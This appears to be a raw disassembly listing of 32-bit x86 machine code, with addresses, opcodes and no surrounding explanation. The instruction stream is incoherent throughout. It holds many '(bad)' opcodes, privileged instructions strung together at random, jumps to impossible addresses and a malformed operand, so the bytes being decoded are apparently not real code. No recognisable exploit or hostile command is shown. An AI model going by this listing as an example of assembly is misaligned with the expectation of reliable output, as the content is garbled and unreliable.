  43235c:	in     al,0xeb
  43235e:	jno    0x4322eb
  432360:	push   edx
  432361:	mov    DWORD PTR [eax-0x28],edx
  432364:	mov    eax,DWORD PTR [ebp+0x20]
  432367:	je     0x4322f0
  432369:	mov    eax,DWORD PTR [ecx]
  43236b:	sbb    BYTE PTR [eax],al
  43236d:	pop    DWORD PTR [eax]
  43236f:	add    esi,eax
  432371:	add    bl,al
  432373:	adc    DWORD PTR [edi],esi
  432375:	jmp    0x8bce73c7
  43237a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432381:	jne    0x43230e
  432383:	mov    ecx,DWORD PTR [eax]
  432385:	in     al,0x75
  432387:	pop    DWORD PTR [ecx+0x5401]
  43238d:	push   edx
  43238e:	inc    DWORD PTR [ebx]
  432390:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432396:	add    BYTE PTR [edi+0x9],dl
  432399:	call   DWORD PTR [esi]
  43239b:	and    dl,al
  43239d:	and    bh,bh
  43239f:	inc    edi
  4323a1:	test   eax,edx
  4323a3:	sldt   ebx
  4323a6:	xor    al,BYTE PTR [eax]
  4323a8:	pushf  
  4323a9:	(bad)  
  4323aa:	jmp    0x4323b8
  4323ac:	mov    eax,edi
  4323ae:	or     al,0x75
  4323b0:	inc    eax
  4323b1:	call   0x431ab9
  4323b6:	mov    eax,eax
  4323b8:	loopne 0x43233e
  4323ba:	inc    ebp
  4323bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4323c1:	mov    eax,DWORD PTR [ebp+0x20]
  4323c4:	add    edi,ecx
  4323c6:	add    BYTE PTR [eax],ch
  4323c8:	cmp    edi,0x18
  4323cb:	test   DWORD PTR [ebp+0xf],esi
  4323ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323d5:	jne    0x4323d9
  4323d7:	call   0xffa21e9c
  4323dc:	leave  
  4323dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4323e1:	add    ah,ch
  4323e3:	add    BYTE PTR [edi-0x48fef979],dh
  4323e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323f0:	inc    esp
  4323f1:	mov    ebx,DWORD PTR [eax]
  4323f3:	fcom   st(2)
  4323f5:	add    BYTE PTR [edi],bl
  4323f7:	lea    ecx,[eax-0x18]
  4323fa:	(bad)  
  4323fb:	push   DWORD PTR [ecx]
  4323fd:	call   0xffb5715f
  432402:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432406:	fstp   DWORD PTR [esi+ebx*8]
  432409:	push   ebp
  43240a:	pop    ebp
  43240b:	mov    esi,DWORD PTR [edx-0x38]
  43240e:	add    DWORD PTR [eax],0x28
  432411:	mov    edi,DWORD PTR [ebx]
  432413:	xor    esi,DWORD PTR [edx+0x3]
  432416:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43241a:	pop    ebp
  43241b:	or     al,0x4
  43241d:	inc    ecx
  43241e:	push   ebp
  43241f:	(bad)  
  432420:	in     al,dx
  432421:	or     ah,ch
  432423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432424:	xbegin 0xffc89a1a
  43242a:	clc    
  43242b:	adc    al,0x45
  43242d:	div    BYTE PTR [edx]
  43242f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432436:	test   DWORD PTR [ebx+0x666300f8],ebx
  43243c:	add    BYTE PTR [ecx+0x66],dh
  43243f:	add    eax,DWORD PTR [ebp+0x52]
  432442:	adc    eax,0xffffffa0
  432445:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43244b:	test   DWORD PTR [eax],eax
  43244d:	clc    
  43244e:	data16 or al,BYTE PTR [ebp+0x45]
  432452:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432459:	rol    BYTE PTR [ebp+0x45],1
  43245c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432462:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432468:	push   ebx
  432469:	add    BYTE PTR [eax+eax*1+0x51],dl
  43246d:	jge    0x4324a2
  43246f:	add    BYTE PTR [esi+0x4],dl
  432472:	jne    0x4324d9
  432474:	mov    edx,0x457200
  432479:	jmp    0x43243d
  43247b:	xor    edi,DWORD PTR [ebx]
  43247d:	pop    edi
  43247e:	cvtdq2ps xmm7,xmm0
  432481:	ret    0x0
  432484:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43248a:	xor    ecx,DWORD PTR [edi]
  43248c:	add    eax,DWORD PTR [ecx+0x3b]
  43248f:	push   ebx
  432490:	rdpmc  
  432492:	out    0x8d,al
  432494:	add    BYTE PTR [eax],cl
  432496:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43249c:	ret    0x450c
  43249f:	sbb    al,0x8b
  4324a1:	cmp    eax,esi
  4324a3:	or     cl,al
  4324a5:	or     al,0xc2
  4324a7:	pop    eax
  4324a8:	inc    ebp
  4324a9:	add    ecx,DWORD PTR [edi]
  4324ab:	add    esi,DWORD PTR [ebp+0x39]
  4324ae:	invd   
  4324b0:	jge    0x4324bc
  4324b2:	mov    eax,0x478ac0
  4324b7:	cli    
  4324b8:	xor    esp,ecx
  4324ba:	mov    ebx,0x5b8ac0
  4324bf:	ret    0x33
  4324c2:	mov    eax,0x833b8b
  4324c7:	sub    BYTE PTR [ebx],al
  4324c9:	inc    ebp
  4324ca:	xor    ax,di
  4324cd:	pushf  
  4324ce:	inc    bh
  4324d0:	mov    esp,esp
  4324d2:	hlt    
  4324d3:	test   DWORD PTR [ebp-0x8],esi
  4324d6:	mov    eax,DWORD PTR [ebp-0x14]
  4324d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324df:	dec    edi
  4324e0:	or     BYTE PTR [eax],al
  4324e2:	jne    0x43246d
  4324e4:	mov    esi,esp
  4324e6:	call   0x77a9b0ab
  4324eb:	inc    ebp
  4324ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324f8:	add    BYTE PTR [esi+0x7d],ah
  4324fb:	inc    ebp
  4324fc:	mov    bx,WORD PTR [ebp+0x8]
  432500:	add    DWORD PTR [ebp+0x54],0x30c008b
  432507:	inc    ebp
  432508:	mov    bx,di
  43250b:	lock test BYTE PTR [ecx+0x7000801],bh
  432512:	jge    0x4324d5
  432514:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43251a:	cli    
  43251b:	xor    bl,bh
  43251d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432523:	test   BYTE PTR [eax],cl
  432525:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43252c:	cmp    ebp,eax
  43252e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432535:	test   BYTE PTR [ebp+0x1],bh
  432538:	mov    ebx,0x458a00
  43253d:	xor    esi,DWORD PTR [ebx]
  43253f:	add    esp,DWORD PTR [esi-0x77]
  432542:	pop    ebp
  432543:	loopne 0x4325ab
  432545:	inc    ebp
  432546:	clc    
  432547:	xor    edi,DWORD PTR [ebx]
  432549:	add    esi,DWORD PTR [edx-0x77]
  43254c:	data16 fdivr QWORD PTR [ebp-0x49]
  432550:	mov    ebx,0xb78afc
  432555:	hlt    
  432556:	xor    edi,DWORD PTR [esi+eiz*2]
  432559:	add    BYTE PTR [ebp+0x66],bl
  43255c:	data16 lock clc 
  43255f:	cmp    al,0x3b
  432561:	add    BYTE PTR [edi+0x66],dh
  432564:	psubq  mm7,QWORD PTR [ebp+0x2]
  432568:	ltr    WORD PTR [ebp+0x66]
  43256c:	add    esi,eax
  43256e:	add    di,WORD PTR [ebp+0x2b]
  432572:	data16 data16 jge 0x4325f3
  432576:	mov    ebx,0xe08a8b
  43257b:	jge    0x4325b0
  43257d:	data16 data16 xor al,0x5d
  432581:	data16 data16 jne 0x43257d
  432585:	mov    edi,DWORD PTR [ebx]
  432587:	fdiv   QWORD PTR [edx+0x7d]
  43258a:	data16 data16 jge 0x4325c2
  43258e:	mov    ebx,0x758a66
  432593:	mov    esi,0x667233
  432598:	pop    ebp
  432599:	or     BYTE PTR [esi+0x0],ah
  43259c:	clc    
  43259d:	mov    edi,DWORD PTR [ebx]
  43259f:	lock ja 0x43252d
  4325a2:	(bad)  
  4325a4:	jge    0x43259d
  4325a6:	invd   
  4325a8:	pop    ebp
  4325a9:	add    BYTE PTR [ebx],al
  4325ab:	(bad)  
  4325ac:	cmp    di,WORD PTR [ebp+0xf]
  4325b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325b4:	mov    bx,WORD PTR [ebp-0x10]
  4325b8:	pop    bp
  4325ba:	fbstp  TBYTE PTR [ebx]
  4325bc:	test   DWORD PTR [ebx],eax
  4325be:	add    BYTE PTR [ebx],bh
  4325c0:	add    BYTE PTR [esi+0x7d],ah
  4325c3:	jge    0x432550
  4325c5:	data16 in al,dx
  4325c7:	pop    ebp
  4325c8:	stc    
  4325c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325d0:	mov    edi,ebx
  4325d2:	in     al,dx
  4325d3:	test   BYTE PTR [ebp+0x0],bh
  4325d6:	mov    eax,DWORD PTR [eax]
  4325d8:	call   0xbd401f68
  4325dd:	cmp    al,0x9b
  4325df:	add    BYTE PTR [edx],dh
  4325e1:	mov    bx,di
  4325e4:	call   0x8b4ba374
  4325e9:	add    ebp,esp
  4325eb:	mov    bx,di
  4325ee:	jnp    0x432616
  4325f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325f6:	mov    eax,DWORD PTR [eax]
  4325f8:	call   0x7c3eb163
  4325fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432603:	data16 data16 fistp WORD PTR [ebp+0xe]
  432608:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432612:	fisttp WORD PTR [ecx-0x7401f77b]
  432618:	(bad)  
  432619:	cld    
  43261a:	jne    0x432658
  43261c:	xor    eax,DWORD PTR [eax]
  43261e:	mov    esp,DWORD PTR [esi-0x10]
  432621:	sti    
  432622:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432629:	data16 adc bl,bh
  43262c:	push   ebp
  43262d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432634:	mov    WORD PTR [eax],es
  432636:	fwait
  432637:	data16 xor bh,bl
  43263a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432640:	mov    esp,DWORD PTR [esi-0x14]
  432643:	fisttp WORD PTR [ebx-0x3748a9f2]
  432649:	or     al,0x2b
  43264b:	mov    bh,0xba
  43264d:	hlt    
  43264e:	mov    bh,bl
  432650:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432656:	dec    esi
  432657:	or     al,0x0
  432659:	mov    edi,DWORD PTR [ebx]
  43265b:	or     BYTE PTR [ebp+0x3b],dh
  43265e:	mov    ecx,DWORD PTR [edi]
  432660:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432666:	xor    al,0xd8
  432668:	pop    bp
  43266a:	lock xor esi,DWORD PTR [ebx]
  43266d:	lea    esp,[esi+0x1f]
  432670:	icebp  
  432671:	jb     0x432677
  432673:	add    al,al
  432675:	jge    0x432683
  432677:	mov    eax,eax
  432679:	fsubr  st,st(3)
  43267b:	pop    ebp
  43267c:	mov    esi,DWORD PTR [ebx]
  43267e:	in     al,0x8d
  432680:	rcr    DWORD PTR [edi],0xc2
  432683:	jb     0x4326e3
  432685:	add    cl,cl
  432687:	jge    0x432695
  432689:	mov    edx,DWORD PTR [ebp-0x20]
  43268c:	in     al,dx
  43268d:	pop    ebp
  43268e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432693:	cmp    di,WORD PTR [ebp+0x0]
  432697:	mov    ebp,DWORD PTR [ebx]
  432699:	fdivr  QWORD PTR [esi+0x668a5d]
  43269f:	cmp    al,0x33
  4326a1:	mov    si,0x4e7d
  4326a5:	mov    eax,DWORD PTR [eax]
  4326a7:	lock inc ebp
  4326a9:	mov    esi,DWORD PTR [eax]
  4326ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4326b2:	clc    
  4326b3:	(bad)  
  4326b4:	cmp    edi,DWORD PTR [ebx]
  4326b6:	je     0x4326c7
  4326b8:	push   ebx
  4326b9:	loopne 0x4326ca
  4326bb:	dec    ecx
  4326bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4326c0:	int    0xf1
  4326c2:	mov    esi,0x703084d
  4326c7:	pcmpgtd mm6,mm1
  4326ca:	add    BYTE PTR [ebp+0x66],dh
  4326cd:	jmp    0x43269a
  4326cf:	mov    eax,DWORD PTR [ebx]
  4326d1:	lock push ebp
  4326d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326d9:	or     bh,dl
  4326db:	jb     0x4326db
  4326dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326e3:	loopne 0x4326e5
  4326e5:	jne    0x4326e9
  4326e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4326eb:	mov    ecx,ebx
  4326ed:	data16 cmp al,0xf1
  4326f0:	add    BYTE PTR [esi+eiz*2],bh
  4326f3:	add    bl,cl
  4326f5:	retw   0xf2
  4326f9:	ret    0x66
  4326fc:	retf   
  4326fd:	enterw 0x4df1,0x19
  432702:	pop    edi
  432703:	jne    0x432686
  432705:	mov    esi,DWORD PTR [eax]
  432707:	call   0x77b7b2a8
  43270c:	xor    ebp,DWORD PTR [ebx]
  43270e:	lea    esp,[esi+0x48]
  432711:	repnz in eax,0x3b
  432714:	add    BYTE PTR [ebp-0x37],dh
  432717:	xor    edx,DWORD PTR [ebp-0x15]
  43271a:	in     al,dx
  43271b:	xor    edx,DWORD PTR [esi+0x40]
  43271e:	mov    DWORD PTR [edi],0x338545fc
  432724:	clc    
  432725:	add    esi,DWORD PTR [ecx]
  432727:	pop    edi
  432728:	pushf  
  432729:	pop    ebx
  43272a:	call   0xff4426f1
  43272f:	mov    edi,eax
  432731:	push   ecx
  432732:	pop    es
  432733:	mov    edi,DWORD PTR [eax]
  432735:	push   esi
  432736:	inc    esi
  432737:	add    bh,BYTE PTR [esi+0x0]
  43273a:	popa   
  43273b:	data16 (bad) 
  43273d:	into   
  43273e:	gs cmp al,0xcd
  432741:	add    BYTE PTR [ecx+0x7ce0866],bh
  432747:	ret    0x66
  43274a:	add    bh,al
  43274c:	add    bh,ah
  43274e:	add    BYTE PTR [ebp+0x31c3f866],al
  432754:	cmp    al,0x9c
  432756:	add    BYTE PTR [esi+0x66],ah
  432759:	into   
  43275a:	ret    
  43275b:	pop    ebp
  43275c:	adc    BYTE PTR [edi+0x0],dl
  43275f:	mov    bh,0x66
  432761:	mov    edi,0xff038dc3
  432766:	jne    0x4327bc
  432768:	lea    edx,[ecx+0x1]
  43276b:	mov    ebx,0xd64ff1
  432770:	sar    DWORD PTR [ebx],1
  432772:	test   BYTE PTR [ebp+0x36],dh
  432775:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432779:	push   edi
  43277a:	xor    BYTE PTR [ebx],0x38
  43277d:	mov    esi,ebx
  43277f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432785:	ss inc ebp
  432787:	fs pop ebx
  432789:	mov    ebx,0x9c3b30
  43278e:	je     0x4327bb
  432790:	xor    edi,DWORD PTR [ebx+0x668a33]
  432796:	mov    WORD PTR [ebx],?
  432798:	ss mov ebx,0x8b4e64
  43279e:	pop    edi
  43279f:	cmp    ecx,ecx
  4327a1:	jne    0x4327f8
  4327a3:	mov    ebp,esp
  4327a5:	cld    
  4327a6:	push   esi
  4327a7:	pop    ebx
  4327a8:	inc    ebp
  4327a9:	stc    
  4327aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4327b0:	test   esi,ecx
  4327b2:	clc    
  4327b3:	test   dl,dl
  4327b5:	cmp    bh,bh
  4327b7:	fs pop si
  4327ba:	or     bl,al
  4327bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4327c2:	retf   0x3c45
  4327c5:	xor    BYTE PTR [eax],al
  4327c7:	pushf  
  4327c8:	mov    si,0x85ca
  4327cc:	ret    0xf8
  4327cf:	pop    ebx
  4327d0:	dec    dx
  4327d3:	mov    edx,DWORD PTR [edi-0x76]
  4327d6:	push   edi
  4327d7:	add    al,0xb7
  4327d9:	xor    al,0xba
  4327db:	cmp    al,0x8d
  4327dd:	je     0x4327de
  4327df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327e3:	lea    edi,[ebx+0x544fff]
  4327e9:	push   ecx
  4327ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4327ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327f3:	add    BYTE PTR [ebx],dh
  4327f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432802:	mov    ebx,0x3b3b00
  432807:	jne    0x432834
  432809:	mov    DWORD PTR [ebx+0x728afc],edi
  43280f:	xor    esi,DWORD PTR [ebx]
  432811:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432817:	push   edi
  432818:	cmp    esp,ebp
  43281a:	jne    0x43281c
  43281c:	sbb    DWORD PTR [eax],0x8085c3fc
  432822:	clc    
  432823:	inc    esi
  432824:	pop    ebx
  432825:	sti    
  432826:	add    eax,0xeb8bc075
  43282b:	cld    
  43282c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432832:	mov    ecx,DWORD PTR [ecx+edx*2]
  432835:	rol    DWORD PTR [ebp-0x37],0xf
  432839:	mov    DWORD PTR [eax],ecx
  43283b:	inc    edi
  43283c:	(bad)  
  43283d:	in     eax,0xfe
  43283f:	add    bh,bh
  432841:	(bad)  
  432842:	mov    esi,0xc38a5e
  432847:	mov    esi,DWORD PTR [ebx]
  432849:	push   ecx
  43284a:	mov    edi,0xfc4ec7
  43284f:	test   DWORD PTR [ebp-0x8],edx
  432852:	xor    di,ax
  432855:	pushf  
  432856:	sub    ebp,eax
  432858:	inc    ebp
  432859:	(bad)  
  43285a:	sub    edi,edi
  43285c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432862:	inc    ebp
  432863:	add    BYTE PTR [esi+0x2b],ah
  432866:	or     bh,BYTE PTR [edx+0xf8ac2]
  43286c:	cmp    al,0x33
  43286e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432874:	(bad)  
  432875:	cmp    esi,DWORD PTR [ebx]
  432877:	je     0x432831
  432879:	push   ebx
  43287a:	dec    esi
  43287b:	str    ecx
  43287e:	cmp    esp,DWORD PTR [ebp+0x75]
  432881:	int    0x33
  432883:	mov    edi,0x789085f
  432888:	mov    edx,DWORD PTR [eax]
  43288a:	cld    
  43288b:	add    cl,cl
  43288d:	data16 add al,0xcb
  432890:	push   ebp
  432891:	add    ebp,esp
  432893:	jne    0x432881
  432895:	(bad)  
  432896:	mov    DWORD PTR [ecx],0xd685f7ec
  43289c:	clc    
  43289d:	xlat   BYTE PTR ds:[ebx]
  43289e:	inc    ebp
  43289f:	mov    esi,DWORD PTR [edx]
  4328a1:	push   eax
  4328a2:	pushf  
  4328a3:	in     eax,0x8b
  4328a5:	add    ah,ch
  4328a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4328ab:	add    ax,0x72cb
  4328af:	cmp    al,0x0
  4328b1:	add    BYTE PTR [ebp+0x66],al
  4328b4:	(bad)  
  4328b5:	retf   
  4328b6:	lock ret 0x85
  4328ba:	clc    
  4328bb:	inc    bp
  4328bd:	retf   
  4328be:	cmp    eax,0xc77d9cc8
  4328c3:	xor    ah,bh
  4328c5:	pushf  
  4328c6:	test   DWORD PTR [edi-0x8],ebx
  4328c9:	je     0x432910
  4328cb:	xor    esi,DWORD PTR ds:0x7020840
  4328d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4328d5:	push   ebp
  4328d6:	add    esp,ebp
  4328d8:	jb     0x432865
  4328da:	add    BYTE PTR [eax],cl
  4328dc:	dec    ebp
  4328dd:	mov    bh,0x81
  4328df:	push   esi
  4328e0:	push   esp
  4328e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328e8:	xor    al,BYTE PTR [eax]
  4328ea:	mov    edx,DWORD PTR [edi+0x10]
  4328ed:	(bad)  
  4328ee:	scas   eax,DWORD PTR es:[edi]
  4328ef:	ret    0x3b
  4328f2:	jns    0x3b4425e5
  4328f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328fc:	dec    ebp
  4328fd:	or     BYTE PTR [ebx],ch
  4328ff:	ret    0x458b
  432902:	lock jmp 0x4328f6
  432905:	mov    ecx,DWORD PTR [eax]
  432907:	or     BYTE PTR [edi],al
  432909:	mov    ecx,eax
  43290b:	xor    DWORD PTR [edx+0x2],0x0
  43290f:	mov    bh,0xc1
  432911:	adc    BYTE PTR [eax],dh
  432913:	iret   
  432914:	inc    ebp
  432915:	mov    DWORD PTR [ebx],0x4dfff8c4
  43291b:	inc    BYTE PTR [ebx]
  43291d:	ret    0xf8
  432920:	adc    DWORD PTR [esi+0x10],esp
  432923:	clc    
  432924:	dec    ecx
  432925:	fisttp WORD PTR [ecx+0x456604c0]
  43292b:	add    dh,BYTE PTR ds:0x75e0845
  432931:	ret    0x4d
  432934:	lea    ecx,[ebx+0x18728301]
  43293a:	add    BYTE PTR [ebp+0x45],al
  43293d:	xor    ecx,ebp
  43293f:	pushf  
  432940:	add    bh,al
  432942:	add    al,ch
  432944:	inc    ebp
  432945:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43294b:	xor    eax,0x781084d
  432950:	push   esp
  432951:	fwait
  432952:	push   ecx
  432953:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432959:	inc    ebp
  43295a:	cmp    edi,DWORD PTR [ecx]
  43295c:	jbe    0x4328fa
  43295e:	mov    eax,edi
  432960:	or     ah,dh
  432962:	inc    ebp
  432963:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432969:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43296f:	in     al,dx
  432970:	hlt    
  432971:	push   esp
  432972:	push   esp
  432973:	push   ecx
  432974:	push   ecx
  432975:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43297b:	fwait
  43297c:	fwait
  43297d:	xor    dh,BYTE PTR [edx]
  43297f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432985:	or     BYTE PTR [ebp+0x7],al
  432988:	mov    eax,ecx
  43298a:	clc    
  43298b:	jb     0x43294e
  43298d:	add    BYTE PTR [ebp+0x55],cl
  432990:	or     DWORD PTR [edi],0xc251d154
  432996:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4329a0:	mov    edi,eax
  4329a2:	or     cl,al
  4329a4:	inc    ebp
  4329a5:	dec    ebp
  4329a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4329ac:	or     WORD PTR [ecx],0x899b
  4329b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329b7:	mov    edx,DWORD PTR [ecx+0x8]
  4329ba:	mov    eax,DWORD PTR [ebp-0x8]
  4329bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329ca:	inc    ebp
  4329cb:	dec    eax
  4329cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329d2:	add    edx,DWORD PTR [ecx-0x8]
  4329d5:	mov    ecx,DWORD PTR [ecx]
  4329d7:	clc    
  4329d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329df:	mov    ecx,ebp
  4329e1:	clc    
  4329e2:	(bad)  
  4329e3:	popf   
  4329e4:	inc    DWORD PTR [eax]
  4329e6:	ret    0x8b
  4329e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329ef:	mov    edi,esp
  4329f1:	hlt    
  4329f2:	test   ecx,esi
  4329f4:	clc    
  4329f5:	or     BYTE PTR [ebp+0x7],al
  4329f8:	xor    al,cl
  4329fa:	pushf  
  4329fb:	jb     0x432a30
  4329fd:	add    BYTE PTR [eax-0x3f],al
  432a00:	inc    eax
  432a01:	daa    
  432a02:	inc    ebp
  432a03:	inc    ebp
  432a04:	xor    eax,0x7f80803
  432a09:	dec    ebp
  432a0a:	fwait
  432a0b:	add    esi,DWORD PTR [edx]
  432a0d:	clc    
  432a0e:	cmp    DWORD PTR [ecx],ecx
  432a10:	or     al,0x8
  432a12:	add    al,BYTE PTR [ebp+0x2c]
  432a15:	xor    eax,0x7350845
  432a1a:	or     BYTE PTR [ebp+0x7],cl
  432a1d:	lea    ebx,[ebx-0x748dcdff]
  432a23:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a2a:	mov    edx,DWORD PTR [eax]
  432a2c:	cld    
  432a2d:	dec    ebp
  432a2e:	push   esp
  432a2f:	sub    edx,DWORD PTR [ecx-0x75]
  432a32:	add    eax,0xf172fc
  432a37:	or     BYTE PTR [ebp+0x7],cl
  432a3a:	add    eax,ecx
  432a3c:	or     al,0x72
  432a3e:	add    DWORD PTR [eax],eax
  432a40:	mov    ebx,0x29c2c1
  432a45:	inc    ebp
  432a46:	mov    eax,DWORD PTR [ebx]
  432a48:	cmp    eax,0x3004d1c
  432a4e:	xbegin 0x66c8b648
  432a54:	clc    
  432a55:	or     BYTE PTR [ebp+0x45],al
  432a58:	xor    dh,BYTE PTR ds:0x78b089c
  432a5e:	adc    BYTE PTR [ebp+0x45],cl
  432a61:	lea    eax,[ebp+0x33727501]
  432a67:	add    cl,ch
  432a69:	inc    ebp
  432a6a:	add    bl,ch
  432a6c:	add    BYTE PTR [ebx+0x45850845],cl
  432a72:	je     0x4329ff
  432a74:	push   ebx
  432a75:	or     al,0x85
  432a77:	dec    ebp
  432a78:	std    
  432a79:	mov    bh,bh
  432a7b:	mov    BYTE PTR [ebp-0x75],al
  432a7e:	mov    edi,eax
  432a80:	or     al,0x89
  432a82:	inc    ebp
  432a83:	clc    
  432a84:	mov    esp,esp
  432a86:	hlt    
  432a87:	call   DWORD PTR [edi-0x37]
  432a8a:	push   esp
  432a8b:	or     al,0x51
  432a8d:	push   ebp
  432a8e:	xor    ebp,esp
  432a90:	mov    esi,0x457251
  432a95:	xor    esi,eax
  432a97:	pushf  
  432a98:	inc    ebp
  432a99:	(bad)  
  432a9a:	mov    edi,eax
  432a9c:	or     al,0x85
  432a9e:	add    al,bh
  432aa0:	inc    eax
  432aa2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432aa6:	or     ah,bh
  432aa8:	inc    eax
  432aa9:	push   esp
  432aaa:	jmp    0x432afd
  432aac:	mov    eax,DWORD PTR ds:0xe8720c
  432ab2:	mov    DWORD PTR [ebp-0x8],eax
  432ab5:	jne    0x432afc
  432ab7:	jmp    0x432a44
  432ab9:	mov    ebp,DWORD PTR [eax]
  432abb:	clc    
  432abc:	retf   0xff54
  432abf:	push   ecx
  432ac0:	mov    DWORD PTR ds:0x757210,eax
  432ac6:	mov    ecx,DWORD PTR [ebp-0x4]
  432ac9:	sub    esp,DWORD PTR [ebx-0x77]
  432acc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432ad3:	or     ah,bh
  432ad5:	pop    es
  432ad6:	ds fwait
  432ad8:	push   DWORD PTR [edx]
  432ada:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432ae0:	(bad)  
  432ae1:	mov    bh,bh
  432ae3:	jmp    0x432ad1
  432ae5:	leave  
  432ae6:	jne    0x432af0
  432ae8:	call   0x302442
  432aed:	in     al,dx
  432aee:	dec    ebp
  432aef:	add    dh,BYTE PTR [ebx]
  432af1:	add    BYTE PTR [ebx],al
  432af3:	inc    ebp
  432af4:	cmp    esi,DWORD PTR [ecx]
  432af6:	je     0x432a94
  432af8:	mov    eax,edi
  432afa:	or     al,0xf0
  432afc:	add    BYTE PTR [ebp+0x458bf845],al
  432b02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b08:	adc    al,0x7
  432b0a:	enter  0x9fc0,0xa5
  432b0e:	rol    BYTE PTR [eax],0x5e
  432b11:	mov    ecx,ecx
  432b13:	or     al,0xc
  432b15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b1c:	jmp    0x432b1d
  432b1e:	push   ebp
  432b1f:	mov    esp,ebp
  432b21:	cld    
  432b22:	inc    ebp
  432b23:	inc    ebp
  432b24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b2b:	push   esi
  432b2c:	push   esi
  432b2d:	mov    edi,0x7af080f
  432b32:	add    bh,al
  432b34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432b40:	mov    ebp,eax
  432b42:	mov    ebp,edi
  432b44:	lock call edx
  432b47:	fcom   DWORD PTR [ebp+0x45]
  432b4a:	mov    eax,0x148a8b
  432b4f:	push   ecx
  432b50:	enter  0xc145,0x83
  432b54:	cmp    ecx,DWORD PTR [eax]
  432b56:	add    BYTE PTR [ebp+0x4d],al
  432b59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b5f:	call   0xffa326ce
  432b64:	cmp    eax,DWORD PTR [ebp-0xc]
  432b67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b6b:	push   ebp
  432b6c:	(bad)  
  432b6d:	call   0x342971
  432b72:	mov    bh,0xdb
  432b74:	cld    
  432b75:	or     BYTE PTR [ebp+0x45],bl
  432b78:	(bad)  
  432b79:	call   0xff7d2809
  432b7e:	add    al,BYTE PTR [ebp+0x37]
  432b81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b87:	jne    0x432b89
  432b89:	(bad)  
  432b8a:	cmp    edi,esp
  432b8c:	jne    0x432bbf
  432b8e:	mov    edi,edi
  432b90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b96:	pop    ds
